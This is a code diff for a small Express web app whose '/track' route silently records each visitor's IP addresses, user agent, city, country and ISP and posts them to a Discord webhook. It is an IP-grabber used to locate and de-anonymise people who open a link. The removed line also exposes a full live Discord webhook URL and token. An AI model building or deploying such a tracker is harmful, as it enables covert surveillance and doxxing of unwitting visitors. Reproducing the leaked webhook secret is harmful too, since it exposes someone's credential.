@@ -4,7 +4,7 @@ import fetch from "node-fetch";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";
+const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE";
 
 app.set("trust proxy", true);
 
@@ -13,18 +13,36 @@ app.get("/", (req, res) => {
     res.sendFile("index.html", { root: process.cwd() });
 });
 
-// TRACK
+// TRACK ROUTE
 app.get("/track", async (req, res) => {
 
     // =========================
-    // 1. RAW IP SOURCES
+    // 1. RAW IP DATA
     // =========================
-    const forwarded = req.headers["x-forwarded-for"] || "None";
-    const socketIp = req.socket.remoteAddress || "None";
+    const forwarded = req.headers["x-forwarded-for"];
+    const socketIp = req.socket.remoteAddress || "Unknown";
 
-    // Clean first real IP from forwarded list
-    let realIp = forwarded.split(",")[0].trim();
-    realIp = realIp.replace("::ffff:", "");
+    let ipList = [];
+
+    if (forwarded) {
+        ipList = forwarded.split(",").map(ip => ip.trim());
+    }
+
+    // Add socket IP as fallback
+    ipList.push(socketIp);
+
+    // Clean all IPs
+    ipList = ipList
+        .map(ip => ip.replace("::ffff:", "").trim())
+        .filter(Boolean);
+
+    // =========================
+    // 2. PRIORITIZE IPV6
+    // =========================
+    const ipv6 = ipList.find(ip => ip.includes(":"));
+    const ipv4 = ipList.find(ip => ip.includes("."));
+
+    const realIp = ipv6 || ipv4 || "Unknown";
 
     const userAgent = req.headers["user-agent"] || "Unknown";
 
@@ -32,7 +50,7 @@ app.get("/track", async (req, res) => {
     const isIPv4 = realIp.includes(".");
 
     // =========================
-    // 2. GEO LOOKUP
+    // 3. GEO LOOKUP (ONLY IF VALID IP)
     // =========================
     let city = "Unknown";
     let country = "Unknown";
@@ -46,7 +64,7 @@ app.get("/track", async (req, res) => {
         realIp.startsWith("10.") ||
         realIp.startsWith("172.");
 
-    if (!isLocal && realIp) {
+    if (!isLocal && realIp !== "Unknown") {
         try {
             const geoRes = await fetch(`https://ipwho.is/${realIp}`);
             const data = await geoRes.json();
@@ -60,22 +78,19 @@ app.get("/track", async (req, res) => {
         } catch (err) {
             console.error("Geo lookup failed:", err);
         }
-    } else {
-        city = "Local Network";
-        country = "Local";
     }
 
     // =========================
-    // 3. DISCORD MESSAGE (3 IPs)
+    // 4. DISCORD MESSAGE
     // =========================
     const message = `
 🇵🇭 New Visitor Logged
 
-🌍 Real IP: ${realIp}
-📦 Forwarded IPs: ${forwarded}
-🧠 Socket IP: ${socketIp}
+🌐 IPv6: ${ipv6 || "None"}
+🌐 IPv4: ${ipv4 || "None"}
+🌍 Chosen IP: ${realIp}
 
-📶 Type: ${isIPv4 ? "IPv4" : isIPv6 ? "IPv6" : "Unknown"}
+📶 Type: ${isIPv6 ? "IPv6" : isIPv4 ? "IPv4" : "Unknown"}
 
 📍 Location: ${city}, ${country}
 🏢 ISP: ${isp}
@@ -85,7 +100,7 @@ app.get("/track", async (req, res) => {
 `;
 
     // =========================
-    // 4. SEND TO DISCORD
+    // 5. SEND TO DISCORD
     // =========================
     try {
         await fetch(WEBHOOK_URL, {
